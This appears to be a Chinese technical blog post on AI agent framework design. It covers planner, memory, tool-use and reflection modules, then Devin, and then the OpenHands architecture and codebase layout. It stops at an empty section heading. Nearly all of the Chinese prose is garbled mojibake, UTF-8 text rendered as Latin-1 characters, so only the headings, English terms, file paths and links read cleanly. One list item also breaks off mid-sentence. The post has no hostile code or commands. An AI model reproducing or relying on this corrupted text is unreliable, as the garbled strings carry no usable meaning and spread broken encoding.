<p>æ‹¿browerAgentæ¥è¯´ï¼Œå®ƒä»¬èƒ½ç”Ÿæˆä»£ç ã€è·Ÿç½‘é¡µäº’åŠ¨ï¼Œçœ‹ç€å¾ˆå‰å®³ï¼Œä½†è¿™äº›èƒ½åŠ›å…¶å®é ä¸‰ä¸ªå¤–éƒ¨æ¡ä»¶æ’‘ç€ â€”â€” è€Œè¿™ä¸‰ä¸ªæ¡ä»¶ç°åœ¨è¡Œä¸šé‡Œæ­£å˜å¾—è¶Šæ¥è¶Šé€šç”¨ã€‚</p>
<ul>
<li>åŸºç¡€æ¨¡å‹èƒ½åŠ›äººäººèƒ½ç”¨ã€‚æœªæ¥å¤§è¯­è¨€æ¨¡å‹èƒ½åŠ›è¶Šæ¥è¶Šå¼ºï¼ŒAI Agentèƒ½åšçš„åŠŸèƒ½ä¼šè¶Šæ¥è¶Šå®¹æ˜“å®ç°ï¼Œæ…¢æ…¢å˜æˆè¡Œä¸šæ ‡é…ã€‚è¿™ä¹ˆä¸€æ¥ï¼Œä¸åŒç³»ç»Ÿåœ¨ â€œæ™ºèƒ½â€ ä¸Šçš„å·®è·è¶Šæ¥è¶Šå°ã€‚</li>
<li>æç¤ºè¯æŠ€å·§å®¹æ˜“å¤åˆ¶ã€‚æ²¡æ³•æˆä¸ºç‹¬å®¶ä¼˜åŠ¿ã€‚</li>
<li>å·¥å…·è°ƒç”¨è¶Šæ¥è¶Šæ ‡å‡†åŒ–ã€‚Agent è°ƒç”¨å·¥å…·çš„èƒ½åŠ›ï¼Œæœ¬è´¨å°±æ˜¯ç”¨åˆ«äººçš„ API æ¥å£ã€‚ä»»ä½•å›¢é˜Ÿéƒ½èƒ½ç›´æ¥é›†æˆç°æˆå·¥å…·ï¼Œè¡¥å…¨è‡ªå·±çš„åŠŸèƒ½çŸ­æ¿ï¼Œè¿™æ–¹é¢çš„ç«äº‰æ…¢æ…¢å˜å¾—åƒç¯‡ä¸€å¾‹ã€‚</li>
</ul>
<p>çœŸæ­£çš„æŠ€æœ¯å£å’ï¼Œä»æ¥éƒ½æ˜¯æ‰“é€ ä¸€ä¸ªç¨³å®šã€èƒ½æ§åˆ¶ã€èƒ½ç›‘æ§ã€èƒ½æ‰©å±•çš„åº•å±‚è¿è¡Œç¯å¢ƒã€‚è¿™éœ€è¦å›¢é˜Ÿæœ‰æ·±åšçš„æŠ€æœ¯ç§¯ç´¯ã€èƒ½æå®šå¤æ‚ç³»ç»Ÿï¼Œè¿˜å¾—ä¸€ç›´è¿­ä»£åº”å¯¹æ–°é—®é¢˜ã€‚è¿™äº›é—®é¢˜æ˜¯AIè·Ÿç°å®ä¸–ç•Œäº’åŠ¨æ—¶å¤©ç”Ÿå°±æœ‰çš„ï¼Œä¸ä¼šå› ä¸ºæ¨¡å‹å˜å¼ºå°±è‡ªåŠ¨æ¶ˆå¤±ï¼Œåè€Œä¼šå†³å®šç³»ç»Ÿç¨³ä¸ç¨³å®šã€é ä¸é è°±ã€‚è°èƒ½è§£å†³çŠ¶æ€ç®¡ç†ã€å·¥å…·å®¹é”™ã€è®¡åˆ’å¯æ§ã€è¡Œä¸ºé€æ˜è¿™äº›â€œç³»ç»Ÿçº§ç—›ç‚¹â€ï¼Œè°å°±èƒ½åœ¨AgentæŠ€æœ¯é©å‘½ä¸­å æ®ä¸»åŠ¨ã€‚</p>
<p>æœªæ¥AI Agentç³»ç»Ÿçš„ç«äº‰ï¼Œä¼šä»â€œè°èƒ½åšä»€ä¹ˆâ€çš„åŠŸèƒ½æ¯”æ‹¼ï¼Œå˜æˆâ€œè°èƒ½åšå¾—æ›´ç¨³ã€æ›´å¥½ã€æ›´é•¿ä¹…â€çš„å·¥ç¨‹å®åŠ›è¾ƒé‡â€”â€”è¯´ç™½äº†ï¼Œå·¥ç¨‹å®åŠ›æ‰å†³å®šé•¿æœŸç«äº‰åŠ›ã€‚</p>
<h3 data-id="heading-6">0x02 AI Agent ç³»ç»Ÿ</h3>
<p>æ„å»ºä¸€å¥—æˆç†Ÿçš„ AI Agent Frameworkï¼Œæœ¬è´¨æ˜¯æ‰“é€ ä¸€ä¸ªèƒ½æ”¯æ’‘Agentè‡ªä¸»æ„ŸçŸ¥ã€ç¯å¢ƒæ„ŸçŸ¥ã€å†³ç­–åˆ¶å®šã€åŠ¨ä½œæ‰§è¡Œã€è‡ªæˆ‘è¿›åŒ–çš„ â€œæ•°å­—ç”Ÿå‘½ä½“â€ åŸºç¡€è®¾æ–½ã€‚å…¶æ ¸å¿ƒåœ¨äºæ‹†è§£Agentçš„æ ¸å¿ƒèƒ½åŠ›æ¨¡å—ï¼Œæ˜ç¡®å„ç»„ä»¶çš„èŒè´£è¾¹ç•Œä¸åä½œé€»è¾‘ï¼ŒåŒæ—¶æ”»å…‹ç³»ç»Ÿç¨³å®šæ€§ã€çµæ´»æ€§ä¸å®ç”¨æ€§çš„å…³é”®ç“¶é¢ˆã€‚Agentç³»ç»Ÿæ ¸å¿ƒæ¶µç›–å››å¤§èƒ½åŠ›ï¼š</p>
<ul>
<li>é€šè¿‡ Function Callã€MCP åè®®ç­‰å·¥å…·è°ƒç”¨å®ç°ç¯å¢ƒäº¤äº’æ„ŸçŸ¥ï¼›</li>
<li>å€ŸåŠ© ReActã€Reflexion ç­‰æ–¹æ³•å®Œæˆè‡ªä¸»æ¨ç†å†³ç­–ï¼›</li>
<li>é‡‡ç”¨çŸ­æœŸè®°å¿†ï¼ˆä¾æ‰˜ Prompt / ä¸Šä¸‹æ–‡çª—å£ï¼‰ä¸é•¿æœŸè®°å¿†ï¼ˆé€šè¿‡ RAG å’Œå‘é‡æ•°æ®åº“ç®¡ç†ï¼‰çš„èŒƒå¼è¿›è¡ŒçŸ¥è¯†ç®¡ç†ï¼›</li>
<li>é€šè¿‡ A2Aã€ACPã€ANP ç­‰åè®®è¾¾æˆå¤šAgenté—´çš„é€šä¿¡åä½œã€‚</li>
</ul>
<h4 data-id="heading-7">2.1 æ¶æ„è®¾è®¡çš„éš¾ç‚¹</h4>
<p>å¤§æ¨¡å‹æœ¬è´¨æ˜¯æ¦‚ç‡è¾“å‡ºï¼Œè¿™ç§â€œæ¦‚ç‡æœ¬æ€§â€å¸¦æ¥çš„ä¸‰ä½ä¸€ä½“é£é™©</p>
<ul>
<li>ä¸ä¸€è‡´æ€§ï¼šåŒä¸€è¾“å…¥å¤šæ¬¡é‡‡æ ·ç»“æœå‘æ•£ã€‚</li>
<li>ä¸çœŸå®æ€§ï¼šå¹»è§‰å¯¼è‡´äº‹å®é”™è¯¯ã€‚</li>
<li>ä¸åŠæ—¶æ€§ï¼šé™æ€è®­ç»ƒæ•°æ®è¿‡æœŸã€‚</li>
</ul>
<p>è¿™æ ·å¯¼è‡´ Agent å¸¦æ¥çš„çš„å››å¤§ç¡¬æ ¸å¡ç‚¹ä¸ºï¼š</p>
<ol>
<li>è®°å¿†æ–­ç‰‡ã€‚å•çº¯çš„Agentç¼ºå°‘ä¸“é—¨çš„ä»»åŠ¡çŠ¶æ€æ„ŸçŸ¥æœºåˆ¶ï¼Œä»…é ä¸Šä¸‹æ–‡æ‹¼æ¥æ— æ³•ç¨³å®šè·Ÿè¸ªé•¿æµç¨‹ä»»åŠ¡ã€‚æ¯”å¦‚ï¼Œå¤šæ­¥ä»»åŠ¡é‡Œï¼Œ â€œä¸­é—´æ€â€åªèººåœ¨ LLM çš„ä¸Šä¸‹æ–‡çª—å£é‡Œï¼Œæ—¢æ²¡æœ‰ç»“æ„åŒ–å­˜å‚¨ï¼Œä¹Ÿæ²¡æœ‰æ˜¾å¼è¯­ä¹‰ç´¢å¼•ã€‚</li>
<li>ä¸€é”™å°±èººã€‚å•çº¯çš„Agent ç¼ºä¹å·¥å…·è°ƒç”¨çš„å¼‚å¸¸æ„ŸçŸ¥ä¸å®¹é”™æœºåˆ¶ï¼Œ</li>
<li>é»‘ç®±æ‹†åŒ…ã€‚LLM ç›´æ¥åå‡ºè‡ªç„¶è¯­è¨€è®¡åˆ’ï¼Œå¼€å‘è€…æ— æ³•æ’æ‹”ï¼Œæ›´æ— æ³•éªŒè¯ï¼Œåªèƒ½åœ¨æ‰§è¡Œæœ«ç«¯æ‰å‘ç°ã€‚</li>
<li>å®¡è®¡é»‘æ´ã€‚Agent è°ƒäº†è°ã€å–äº†ä»€ä¹ˆå­—æ®µã€åŸºäºå“ªå¥ç”¨æˆ·æç¤ºåšå†³ç­–ï¼Œå…¨ç¨‹æ— ç•™ç—•ï¼Œä¼ä¸šåˆè§„æ— ä»è°ˆèµ·ã€‚</li>
</ol>
<p>å› æ­¤ï¼ŒAgent çš„ç«äº‰æ­£ç¦»å¼€â€œè°èƒ½è°ƒç”¨æ›´å¤š APIâ€ï¼Œè½¬å‘â€œè°èƒ½æŠŠä¸ç¡®å®šçš„æ¨¡å‹å°è£…æˆç¡®å®šæ€§çš„ç³»ç»Ÿâ€ã€‚æŠŠæ¦‚ç‡è£…è¿›çŠ¶æ€æœºï¼ŒæŠŠå¹»è§‰å…³è¿›å®¡è®¡ç¬¼ï¼ŒæŠŠæˆæœ¬å‹è¿›é¢„ç®—è¡¨â€”â€”è¿™æ‰æ˜¯Agent ç³»ç»Ÿçš„çœŸæ­£é—¨æ§›ã€‚</p>
<h4 data-id="heading-8">2.2 æ ¸å¿ƒç»„ä»¶</h4>
<p>Agentç»éå•ä¸€è¯­è¨€æ¨¡å‹çš„å¢å¼ºç‰ˆï¼ŒLLMä»…ç›¸å½“äºå…¶ â€œè®¤çŸ¥ä¸­æ¢â€ï¼ŒçœŸæ­£æ”¯æ’‘å…¶å®Œæ•´åŠŸèƒ½çš„æ˜¯ä¸€å¥—ååŒè¿ä½œçš„å¤šæ¨¡å—æ¶æ„ï¼Œæˆç†Ÿå¯è½åœ°çš„Agentç³»ç»Ÿè‡³å°‘åŒ…å«å‡ å¤§æ ¸å¿ƒæ¨¡å—ï¼Œå„æ¨¡å—å¦‚åŒç²¾å¯†å›¢é˜Ÿä¸­çš„ä¸åŒè§’è‰²ï¼Œå„å¸å…¶èŒåˆç´§å¯†é…åˆã€‚</p>
<ul>
<li>è§„åˆ’ä¸å†³ç­–å¼•æ“ï¼ˆPlanner / Policyï¼‰ã€‚LLM ä½œä¸º â€œè®¤çŸ¥ä¸­æ¢â€ï¼Œå°±åƒå›¢é˜Ÿé‡Œçš„ â€œæ™ºå›Šå›¢â€ï¼Œæ ¸å¿ƒè´Ÿè´£è§£æç”¨æˆ·ä»»åŠ¡æ„å›¾ã€æŠŠç”¨æˆ·çš„â€œå¤æ‚ç»ˆæç›®æ ‡â€åˆ‡æˆâ€œå¯æ‰§è¡Œçš„å­ä»»åŠ¡åºåˆ—â€ï¼Œæ‹†è§£å¤æ‚ä»»åŠ¡ä¸ºå­ä»»åŠ¡ã€æ˜ç¡®å­ä»»åŠ¡çš„ä¾èµ–å…³ç³»ã€ç”Ÿæˆä»£ç ã€æŠ¥å‘Šç­‰è¾“å‡ºå†…å®¹ã€‚å³æ”¯æŒä¸€æ¬¡æ€§é™æ€è®¡åˆ’ã€ä¹Ÿæ”¯æŒ ReAct / CodeAct è¿™ç§é€æ­¥å±•å¼€ï¼Œå³æ”¯æŒåŠ¨æ€è®¡åˆ’è°ƒæ•´ï¼šæ ¹æ®å·¥å…·è°ƒç”¨ç»“æœã€ç¯å¢ƒå˜åŒ–æˆ–ç”¨æˆ·åé¦ˆï¼Œå®æ—¶ä¿®æ­£å­ä»»åŠ¡æµç¨‹ï¼Œé¿å…è®¡åˆ’ä¸å®é™…æ‰§è¡Œè„±èŠ‚ã€‚</li>
<li>Memory æ¨¡å—æ˜¯ â€œä¸Šä¸‹æ–‡å»¶ç»­å™¨â€ï¼Œè´Ÿè´£å­˜å‚¨å¯¹è¯ä¸Šä¸‹æ–‡ã€ä»»åŠ¡æ‰§è¡Œå…³é”®èŠ‚ç‚¹ä¸è¿›åº¦ã€å†å²ç»éªŒç­‰ä¿¡æ¯ï¼Œä¿éšœä»»åŠ¡æ‰§è¡Œçš„è¿è´¯æ€§ã€‚ç”¨äºå­˜å‚¨å¯¹è¯å†å²ã€ä¸­é—´ç»“æœå’Œé•¿æœŸè®°å¿†ã€‚è¿™æ ·ï¼Œé€šè¿‡åœ¨Promptä¸­å¼•å…¥å¯¹å‰æ–‡çš„æ€»ç»“æˆ–å…³é”®æ•°æ®ï¼ŒAgentèƒ½â€œè®°ä½â€å…ˆå‰æ­¥éª¤çš„ç»“æœï¼Œç¡®ä¿çŠ¶æ€çš„ä¸€è‡´æ€§å’Œè·¨æ­¥éª¤çš„ä¸Šä¸‹æ–‡è¡”æ¥ã€‚</li>
<li>Planner æ¨¡å—æ‰®æ¼” â€œè¡ŒåŠ¨è·¯çº¿å›¾â€ çš„è§’è‰²ã€‚å…¶å®ç°æœºåˆ¶åŒ…æ‹¬åŸºäºè§„åˆ™çš„å›ºå®šæµç¨‹ï¼ˆé€‚ç”¨äºæ ‡å‡†åŒ–ä»»åŠ¡ï¼‰ã€ä¾æ‰˜ LLM æ¨ç†èƒ½åŠ›çš„åŠ¨æ€ç”Ÿæˆï¼ˆé€‚ç”¨äºçµæ´»éœ€æ±‚ï¼‰ï¼Œä»¥åŠç»“åˆäºŒè€…ä¼˜åŠ¿çš„æ··åˆå‹è°ƒåº¦ï¼ˆå¦‚åŸºäº LangGraph æ„å»ºæœ‰å‘å›¾ä»»åŠ¡æµï¼‰ã€‚</li>
<li>Tool-use æ¨¡å—æ˜¯Agentçš„ â€œæ‰‹è„šâ€ï¼Œè®©æ¨¡å‹â€œçœ‹åˆ°â€å·¥å…·ï¼Œè€Œä¸æ˜¯â€œæ‘¸é»‘â€è°ƒç”¨ï¼Œæ‰“ç ´äº†ä»…è¾“å‡ºæ–‡æœ¬çš„å±€é™ï¼Œé€šè¿‡è°ƒç”¨ç¬¬ä¸‰æ–¹ APIã€æ£€ç´¢å¤–éƒ¨çŸ¥è¯†åº“ã€è¯»å†™æœ¬åœ°æ–‡ä»¶ç­‰æ–¹å¼è¿æ¥å¤–éƒ¨èµ„æºï¼Œå®Œæˆå®é™…æ“ä½œã€‚</li>
<li>Reflection æ¨¡å—èµ‹äºˆAgent â€œå…ƒè®¤çŸ¥èƒ½åŠ›â€ï¼Œå¦‚åŒå›¢é˜Ÿçš„ â€œå¤ç›˜ä¸“å‘˜â€ï¼Œåœ¨ä»»åŠ¡å¤±è´¥æˆ–å—é˜»æ—¶ï¼Œå¯¹æ¯”æ‰§è¡Œç»“æœä¸é¢„æœŸï¼Œè¯„ä¼°æ‰§è¡Œæ•ˆæœã€å®šä½é—®é¢˜åŸå› å¹¶è°ƒæ•´ç­–ç•¥ã€‚</li>
</ul>
<p>è¿™å‡ å¤§æ¨¡å—ç›¸è¾…ç›¸æˆï¼Œæ„æˆ â€œçŠ¶æ€é©±åŠ¨ + æ„å›¾åˆ†è§£ + å·¥å…·è°ƒç”¨ + è‡ªæˆ‘å­¦ä¹ â€ çš„æœ‰æœºæ•´ä½“ï¼Œè€Œéç®€å•å åŠ ã€‚</p>
<p>å¦å¤–ï¼Œåœ¨å…·ä½“å®ç°ä¸­ï¼Œé€šå¸¸ä¹Ÿä¼šæœ‰å¦‚ä¸‹ç»„ä»¶ï¼š</p>
<ul>
<li>äº‹ä»¶æ€»çº¿ï¼ˆEvent Busï¼‰ï¼šç”¨äºè§£è€¦ï¼Œå°†ç”¨æˆ·æ¶ˆæ¯ã€å·¥å…·è¿”å›ã€çŠ¶æ€å˜æ›´ã€å¼‚å¸¸æŠ¥å‘Šéƒ½åºåˆ—åŒ–ä¸ºäº‹ä»¶ï¼Œå¹¿æ’­ç»™è®¢é˜…è€…ã€‚</li>
<li>è¿è¡Œæ—¶æ²™ç®±ï¼ˆRuntime Sandboxï¼‰ï¼šç»™æ¨¡å‹æä¾›â€œåŠ¨æ‰‹â€ç©ºé—´â€”â€”æ–‡ä»¶ç³»ç»Ÿã€ç½‘ç»œã€Shellã€Python è§£é‡Šå™¨ã€ç¬¬ä¸‰æ–¹åº“ã€‚</li>
<li>è§‚æµ‹ä¸é¥æµ‹ï¼ˆObservabilityï¼‰ï¼šæä¾›å¯è§†åŒ–çš„ä»»åŠ¡æ‰§è¡Œç•Œé¢ï¼Œå±•ç¤ºä»»åŠ¡æµç¨‹ã€å­ä»»åŠ¡è¿›åº¦ã€æ¨¡å—äº¤äº’æ—¥å¿—ï¼Œæ”¯æŒå¼€å‘è€…å®æ—¶ç›‘æ§ï¼Œè®©è¿ç»´è€…çœ‹åˆ°ã€Œé»‘ç›’ã€â€”â€”æ¯æ¬¡è°ƒç”¨é“¾ã€token æ¶ˆè€—ã€å¼‚å¸¸æ ˆã€å†³ç­–ç†ç”±å…¨éƒ¨è½ç›˜ã€‚</li>
<li>é…ç½®ä¸å­˜å‚¨æ¨¡å—ï¼ˆConfig &amp; Storageï¼‰ï¼šç®¡ç†æ¡†æ¶çš„å…¨å±€é…ç½®ï¼Œå¦‚ LLM å‚æ•°ã€ä»»åŠ¡é¢„ç®—ï¼ˆæœ€å¤§è¿­ä»£æ¬¡æ•°ã€æˆæœ¬ä¸Šé™ï¼‰ã€å­˜å‚¨è·¯å¾„ã€å·¥å…·åˆ—è¡¨ç­‰ï¼Œæ”¯æŒåŠ¨æ€é…ç½®æ›´æ–°ã€‚å®ç°æ•°æ®æŒä¹…åŒ–ï¼ŒåŒ…æ‹¬ä»»åŠ¡çŠ¶æ€ã€æ‰§è¡Œè½¨è¿¹ã€è®°å¿†æ•°æ®ã€é…ç½®ä¿¡æ¯ç­‰ï¼Œç¡®ä¿ç³»ç»Ÿé‡å¯åå¯æ¢å¤ã€‚</li>
</ul>
<h4 data-id="heading-9">2.3 Devin &amp; OpenHandsï¼ˆåŸOpenDevinï¼‰</h4>
<p>â€ŒDevinæ˜¯ç”±Cognition AIå¼€å‘çš„å…¨çƒé¦–ä¸ªAIç¨‹åºå‘˜ï¼Œå…·å¤‡å…¨æ ˆå¼€å‘èƒ½åŠ›ï¼Œèƒ½è‡ªä¸»å®Œæˆä»£ç ç¼–å†™ã€è°ƒè¯•ã€éƒ¨ç½²åŠAIæ¨¡å‹è®­ç»ƒç­‰ä»»åŠ¡â€Œã€‚Devin ä»£è¡¨äº†ä¸€ç§å…ˆè¿›çš„è‡ªä¸»Agentï¼Œæ—¨åœ¨åº”å¯¹è½¯ä»¶å·¥ç¨‹çš„å¤æ‚æ€§ã€‚å®ƒåˆ©ç”¨äº†è¯¸å¦‚ shellã€ä»£ç ç¼–è¾‘å™¨å’Œç½‘ç»œæµè§ˆå™¨ç­‰å·¥å…·çš„ç»„åˆï¼Œå±•ç¤ºäº† LLM åœ¨è½¯ä»¶å¼€å‘ä¸­æœªè¢«å……åˆ†åˆ©ç”¨çš„æ½œåŠ›ã€‚</p>
<p>OpenDevin é¡¹ç›®è¯ç”Ÿäºå¤åˆ¶ã€å¢å¼ºå¹¶åˆ›æ–°åŸå§‹ Devin æ¨¡å‹çš„æ„¿æœ›ã€‚OpenDevin çš„ç›®æ ‡æ˜¯æ¢ç´¢å¹¶æ‰©å±• Devin çš„èƒ½åŠ›ï¼Œè¯†åˆ«å…¶ä¼˜åŠ¿å’Œæ”¹è¿›é¢†åŸŸï¼Œä»¥æŒ‡å¯¼å¼€æ”¾ä»£ç æ¨¡å‹çš„è¿›å±•ã€‚é€šè¿‡å¸å¼•å¼€æºç¤¾åŒºçš„å‚ä¸ï¼ŒOpenDevin æ—¨åœ¨åº”å¯¹ Code LLM åœ¨å®é™…åœºæ™¯ä¸­é¢ä¸´çš„æŒ‘æˆ˜ï¼Œäº§å‡ºå¯¹ç¤¾åŒºæœ‰é‡å¤§è´¡çŒ®çš„ä½œå“ï¼Œå¹¶ä¸ºæœªæ¥çš„è¿›æ­¥é“ºå¹³é“è·¯ã€‚</p>
<p>OpenHands ç›®å‰ GitHub æ˜Ÿæ ‡æ•°å·²è¶… 6.5 ä¸‡ã€‚</p>
<p>OpenHands çš„ç½‘å€ä¸ºï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.openhands.dev%2F" target="_blank" title="https://docs.openhands.dev/" ref="nofollow noopener noreferrer">docs.openhands.dev/</a></p>
<p>github é“¾æ¥ä¸ºï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FOpenHands%2FOpenHands" target="_blank" title="https://github.com/OpenHands/OpenHands" ref="nofollow noopener noreferrer">github.com/OpenHands/Oâ€¦</a></p>
<p>Software Agent SDK: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FOpenHands%2Fsoftware-agent-sdk" target="_blank" title="https://github.com/OpenHands/software-agent-sdk" ref="nofollow noopener noreferrer">github.com/OpenHands/sâ€¦</a></p>
<p>Benchmarks: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FOpenHands%2Fbenchmarks" target="_blank" title="https://github.com/OpenHands/benchmarks" ref="nofollow noopener noreferrer">github.com/OpenHands/bâ€¦</a></p>
<p>æœ€æ–°çš„OpenHandsè®ºæ–‡å¦‚ä¸‹ï¼šThe OpenHands Software Agent SDK: A Composable and Extensible Foundation for Production Agents 2511.03690v1</p>
<h3 data-id="heading-10">0x03 OpenHands æ¶æ„æ¦‚å¿µå›¾è°±</h3>
<p>ä¸ºç²¾å‡†è§£é” OpenHands æºç çš„æ·±å±‚é€»è¾‘ï¼Œæˆ‘ä»¬éœ€è¦æ„å»ºä¸€å¹…æ¸…æ™°çš„æ¶æ„æ¦‚å¿µå›¾è°±ï¼Œå°†åˆ†æ•£çš„æ ¸å¿ƒç»„ä»¶ä¸è®¾è®¡ç†å¿µä¸²è”æˆæœ‰æœºæ•´ä½“ã€‚è¿™ä¸€å›¾è°±çš„æ¯ä¸€ç¯éƒ½æ‰¿è½½ç€å…³é”®ä½¿å‘½ï¼Œå…±åŒæ„ç­‘èµ· AI Agenté«˜æ•ˆè¿è¡Œçš„åŸºç¡€ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/925c40e26e404219a90815f978073242~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg572X6KW_55qE5oCd6ICD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769433231&amp;x-signature=i0kkI%2FkSx1lWdzpnEpx9dZ88Vbg%3D" alt="OpenHands-ç»„ä»¶" loading="lazy"/></p>
<p>OpenHands-ç»„ä»¶</p>
<h4 data-id="heading-11">3.1 ç³»ç»Ÿæ¶æ„</h4>
<p>ä¸‹å›¾æ˜¯OpenHands ç³»ç»Ÿæ¶æ„çš„é«˜çº§æ¦‚è§ˆã€‚ç³»ç»Ÿåˆ†ä¸ºä¸¤ä¸ªä¸»è¦éƒ¨åˆ†ï¼šå‰ç«¯å’Œåç«¯ã€‚å‰ç«¯è´Ÿè´£å¤„ç†ç”¨æˆ·äº¤äº’å¹¶å±•ç¤ºç»“æœã€‚åç«¯è´Ÿè´£å¤„ç†ä¸šåŠ¡é€»è¾‘å¹¶æ‰§è¡ŒAgentæ“ä½œã€‚è¿™ç§æ¶æ„çš„å…³é”®ä¼˜åŠ¿åœ¨äºå…¶çµæ´»æ€§å’Œå¯æ‰©å±•æ€§ï¼šæ–°çš„Agentç±»å‹ã€è¡ŒåŠ¨ç±»å‹æˆ–è¿è¡Œæ—¶ç¯å¢ƒå¯ä»¥è½»æ¾é›†æˆåˆ°ç°æœ‰ç³»ç»Ÿä¸­ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/db7b3e9538454b13b5fa379a1404082c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg572X6KW_55qE5oCd6ICD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769433231&amp;x-signature=Wdog2eIcVxiOo8dCIg05C2n4NMo%3D" alt="OpenHands-Overview" loading="lazy"/></p>
<p>OpenHands-Overview</p>
<p>åç«¯æ¶æ„å¦‚ä¸‹ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9de55afa100f4b4da11e095b63f9c040~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg572X6KW_55qE5oCd6ICD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769433231&amp;x-signature=SgOqx4sN5kh3xZzybM%2BTNRROM%2BM%3D" alt="OpenHands-ç±»å›¾" loading="lazy"/></p>
<p>OpenHands-ç±»å›¾</p>
<h4 data-id="heading-12">3.2 ä»£ç åº“ç›®å½•ç»“æ„</h4>
<p>OpenHandsçš„ä»£ç åº“ç»„ç»‡æ¸…æ™°ï¼Œä»¥ä¸‹æ˜¯æœ€ä¸»è¦çš„ç›®å½•ï¼š</p>
<ol>
<li><strong>Agentä¸­å¿ƒï¼ˆagenthubï¼‰</strong> ï¼šè¿™æ˜¯Agentçš„æ ¸å¿ƒåŒºåŸŸï¼Œè´Ÿè´£ä»£ç ç”Ÿæˆå’Œæ‰§è¡Œç›¸å…³çš„é€»è¾‘ï¼Œæ˜¯å¹³å°çš„æ ¸å¿ƒèƒ½åŠ›è½½ä½“ã€‚å®ƒåŒ…å«ä¸“æ³¨äºä»£ç ç”Ÿæˆä¸æ‰§è¡Œçš„Agenté€»è¾‘ï¼Œæ˜¯å¹³å°çš„æ ¸å¿ƒèƒ½åŠ›æ‰€åœ¨ã€‚æ­¤å¤–ï¼Œè¿˜åŒ…æ‹¬è´Ÿè´£æµè§ˆå™¨äº¤äº’çš„Agentå®ç°ã€‚</li>
<li><strong>äº‹ä»¶ç³»ç»Ÿï¼ˆeventsï¼‰</strong> ï¼šè¿™æ˜¯äº‹ä»¶é©±åŠ¨æ¶æ„çš„æ ¸å¿ƒç›®å½•ï¼Œå®šä¹‰äº†ç³»ç»Ÿçš„â€œé€šä¿¡è¯­è¨€â€ã€‚å®ƒåŒ…å«å°è£…ä»»åŠ¡æ‰§è¡Œç»“æœç­‰åé¦ˆç±»äº‹ä»¶çš„<code>observation/</code>ï¼Œä»¥åŠå®šä¹‰Agentå¯æ‰§è¡Œçš„å„ç±»åŠ¨ä½œæŒ‡ä»¤çš„<code>action/</code>ã€‚<code>stream.py</code>å®ç°äº†äº‹ä»¶æµçš„ç®¡ç†æœºåˆ¶ï¼Œè´Ÿè´£äº‹ä»¶çš„åˆ†å‘ã€å­˜å‚¨ä¸è®¢é˜…ï¼Œæ˜¯ç»„ä»¶ååŒå·¥ä½œçš„å…³é”®æ¢çº½ã€‚</li>
<li><strong>è¿è¡Œæ—¶ç¯å¢ƒï¼ˆruntime/ï¼‰</strong> ï¼šæä¾›Agentæ‰§è¡Œçš„åº•å±‚ç¯å¢ƒæ”¯æŒã€‚<code>impl/</code>ç›®å½•åŒ…å«Dockerå®¹å™¨ã€æœ¬åœ°ç¯å¢ƒç­‰ä¸åŒè¿è¡Œæ—¶çš„å…·ä½“å®ç°ï¼›<code>plugins/</code>æ”¯æŒé€šè¿‡æ’ä»¶æ‰©å±•è¿è¡Œæ—¶åŠŸèƒ½ï¼Œæå‡ç³»ç»Ÿçš„çµæ´»æ€§ã€‚</li>
<li><strong>è®°å¿†ç®¡ç†ï¼ˆmemory/ï¼‰</strong> ï¼šè´Ÿè´£ç®¡ç†Agentçš„å†å²æ•°æ®ä¸è®°å¿†ã€‚<code>conversation_memory.py</code>å¤„ç†å¯¹è¯å†å²çš„å­˜å‚¨ä¸æ£€ç´¢ï¼›<code>condenser/</code>å®ç°å†å²è®°å½•çš„å‹ç¼©é€»è¾‘ï¼Œè§£å†³LLMä¸Šä¸‹æ–‡çª—å£æœ‰é™çš„é—®é¢˜ï¼Œä¿éšœé•¿å‘¨æœŸä»»åŠ¡çš„è¿è´¯æ€§ã€‚</li>
<li><strong>è¯­è¨€æ¨¡å‹é›†æˆï¼ˆllm/ï¼‰</strong> ï¼šå®ç°ä¸å„ç±»å¤§å‹è¯­è¨€æ¨¡å‹çš„é›†æˆã€‚</li>
<li><strong>æ§åˆ¶å™¨ï¼ˆcontroller/ï¼‰</strong> ï¼šç³»ç»Ÿçš„â€œæŒ‡æŒ¥ä¸­å¿ƒâ€ï¼Œè´Ÿè´£Agentçš„è°ƒåº¦ä¸ç®¡ç†ã€‚</li>
</ol>
<p>è¿™ç§ç»“æ„åæ˜ äº†OpenHandsçš„æ¨¡å—åŒ–è®¾è®¡ï¼Œå„ç»„ä»¶ä¹‹é—´æœ‰æ˜ç¡®çš„èŒè´£åˆ’åˆ†ï¼Œä¾¿äºç»´æŠ¤å’Œæ‰©å±•ã€‚è¿™äº›ç›®å½•ä¹‹é—´çš„é€»è¾‘ç»“æ„å¤§è‡´å¦‚ä¸‹ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a63591e152704c359a97d25106ff75c8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg572X6KW_55qE5oCd6ICD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769433231&amp;x-signature=0DaHoHsOiI3pFWaaHRv7v4ByaIA%3D" alt="OpenHands-æ€»ä½“æµç¨‹" loading="lazy"/></p>
<p>OpenHands-æ€»ä½“æµç¨‹</p>
<h4 data-id="heading-13">3.3 æ ¸å¿ƒç»„ä»¶</h4>
